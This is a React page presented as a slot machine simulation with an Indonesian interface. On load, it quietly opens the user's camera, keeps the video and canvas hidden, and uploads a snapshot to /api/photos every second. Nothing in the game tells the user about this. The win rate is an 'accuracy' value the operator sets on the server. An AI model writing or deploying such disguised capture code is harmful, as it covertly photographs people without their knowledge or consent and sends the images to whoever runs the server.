'use client';

import { useEffect, useRef, useState } from 'react';

const symbols = ['🍒', '🍋', '⭐', '🔔', '7️⃣'];

function randomSymbol() {
  return symbols[Math.floor(Math.random() * symbols.length)];
}

export default function HomePage() {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const savingRef = useRef(false);
  const [accuracy, setAccuracy] = useState(70);
  const [slotResult, setSlotResult] = useState(['🍒', '🍋', '⭐']);
  const [message, setMessage] = useState('Tekan SPIN untuk mencoba.');

  useEffect(() => {
    let timer;
    let stream;

    const startCameraAndCapture = async () => {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
        }

        timer = setInterval(async () => {
          if (!videoRef.current || !canvasRef.current || savingRef.current) {
            return;
          }

          const video = videoRef.current;
          const canvas = canvasRef.current;

          if (!video.videoWidth || !video.videoHeight) {
            return;
          }

          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;

          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          const image = canvas.toDataURL('image/jpeg', 0.7);

          try {
            savingRef.current = true;
            await fetch('/api/photos', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ image })
            });
          } finally {
            savingRef.current = false;
          }
        }, 1000);
      } catch (error) {
        console.error('Kamera tidak tersedia atau izin ditolak.', error);
      }
    };

    startCameraAndCapture();

    return () => {
      if (timer) clearInterval(timer);
      if (stream) {
        stream.getTracks().forEach((track) => track.stop());
      }
    };
  }, []);

  useEffect(() => {
    const loadAccuracy = async () => {
      const response = await fetch('/api/settings');
      const data = await response.json();
      setAccuracy(data.accuracy);
    };

    loadAccuracy();
  }, []);

  const spin = () => {
    const won = Math.random() * 100 < accuracy;
    const result = won
      ? Array(3).fill(randomSymbol())
      : [randomSymbol(), randomSymbol(), randomSymbol()];

    setSlotResult(result);
    setMessage(won ? 'MENANG!' : 'Coba lagi.');
  };

  return (
    <main className="container">
      <h1>SIMULASI MESIN SLOT</h1>

      <video ref={videoRef} autoPlay playsInline muted style={{ display: 'none' }} />
      <canvas ref={canvasRef} style={{ display: 'none' }} />

      <section className="card">
        <h2>Mesin Slot</h2>
        <p>
          Akurasi saat ini: <strong>{accuracy}%</strong>
        </p>
        <div style={{ fontSize: 48, marginBottom: 12 }}>{slotResult.join(' ')}</div>
        <button onClick={spin}>SPIN</button>
        <p>{message}</p>
      </section>
    </main>
  );
}
